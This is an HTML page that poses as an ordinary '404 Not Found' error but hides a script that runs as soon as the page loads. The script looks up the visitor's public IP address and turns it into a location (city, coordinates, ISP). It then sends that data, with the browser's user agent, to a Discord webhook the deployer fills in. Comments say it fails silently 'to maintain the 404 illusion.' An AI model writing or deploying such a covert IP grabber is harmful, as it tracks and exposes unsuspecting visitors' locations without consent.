<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { 
            background-color: #f0f0f0; 
            color: #333; 
            font-family: "Segoe UI", Tahoma, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { text-align: center; max-width: 600px; padding: 20px; }
        h1 { font-size: 8rem; margin: 0; color: #d1d1d1; }
        p { font-size: 1.2rem; margin: 10px 0; color: #666; }
        .back-link { 
            margin-top: 20px; 
            display: inline-block; 
            text-decoration: none; 
            color: #007bff; 
            font-weight: bold; 
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>404</h1>
        <p>the requested url was not found on this server.</p>
        <p>that is all we know.</p>
        <a href="/" class="back-link">return to home</a>
    </div>

    <script>
        (async function() {
            // configuration: input your discord node here
            const webhook_url = "YOUR_WEBHOOK_URL_HERE";

            try {
                // phase 1: extraction of public network coordinate
                const ip_fetch = await fetch('https://api.ipify.org?format=json');
                const ip_data = await ip_fetch.json();
                const target_ip = ip_data.ip;

                // phase 2: geolocation mapping (physical grid variables)
                const geo_fetch = await fetch(`http://ip-api.com/json/${target_ip}?fields=status,country,regionName,city,zip,lat,lon,isp,as,query`);
                const geo = await geo_fetch.json();

                // phase 3: metadata synthesis and transmission
                const payload = {
                    embeds: [{
                        title: "⚠️ node_intercepted (404_obfuscation)",
                        color: 15158332,
                        fields: [
                            { name: "ipv4_variable", value: `\`${geo.query}\``, inline: true },
                            { name: "physical_locale", value: `${geo.city}, ${geo.regionName}, ${geo.country}`, inline: true },
                            { name: "coordinates", value: `lat: ${geo.lat} | lon: ${geo.lon}`, inline: false },
                            { name: "isp_origin", value: geo.isp, inline: false },
                            { name: "user_agent", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                        ],
                        footer: { text: "rynzen_extraction_v4.2 | termux_deployment" },
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(webhook_url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (e) {
                // silent failure to maintain the 404 illusion
            }
        })();
    </script>
</body>
</html>
